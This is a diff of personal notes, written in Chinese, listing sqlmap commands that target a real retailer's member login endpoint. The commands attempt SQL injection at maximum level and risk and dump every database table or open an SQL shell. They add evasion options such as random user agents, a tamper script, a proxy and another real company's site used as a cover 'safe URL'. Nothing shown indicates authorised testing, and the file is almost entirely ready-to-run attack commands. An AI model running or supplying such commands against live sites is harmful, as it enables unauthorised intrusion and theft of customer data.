@@ -10,7 +10,7 @@ $ sqlmap -r loginRequest2.txt -T4 --random-agent --current-db --dbs --tables --d
 使用帶 json 的，sqlmap 不支援 `-p` 指定參數，必須用星號
 
 ```shell
-sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf" -p "id" -T4 -v3 --level 5 --risk 3 --random-agent --force-ssl --tables --dump-all --no-cast
+sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf" -p "id" -T4 -v3 --level 5 --risk 3  --tables --dump-all 
 
 sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf" -p "id" -T4 -v3 --level 5 --risk 3 --random-agent --force-ssl --tables --dump-all --hex
 
@@ -21,8 +21,10 @@ sqlmap -r try3.txt -T4 --random-agent --force-ssl --banner --current-db --dbs --
 
 sqlmap -r try3.txt -T6 --random-agent --force-ssl --banner --current-db --dbs --tables --dump-all --level 5 --risk 3 --threads 10 --sql-shell --dbms=Mysql --fresh-queries --no-cast --proxy="http://192.168.3.19:9527" -v 3 --safe-url="https://www.uniqlo.com" --safe-freq 10 --randomize --tamper="space2mysqlblank.py"
 
-```
+sqlmap -r try3.txt -T4 -v3 --level 5 --risk 3  --tables --dump-all 
 
+```
+[SQLMap - Cheetsheat - HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
 
 -   --safe-url: 隔一会就访问一下的安全URL
 -   --safe-post: 访问安全URL时携带的POST数据
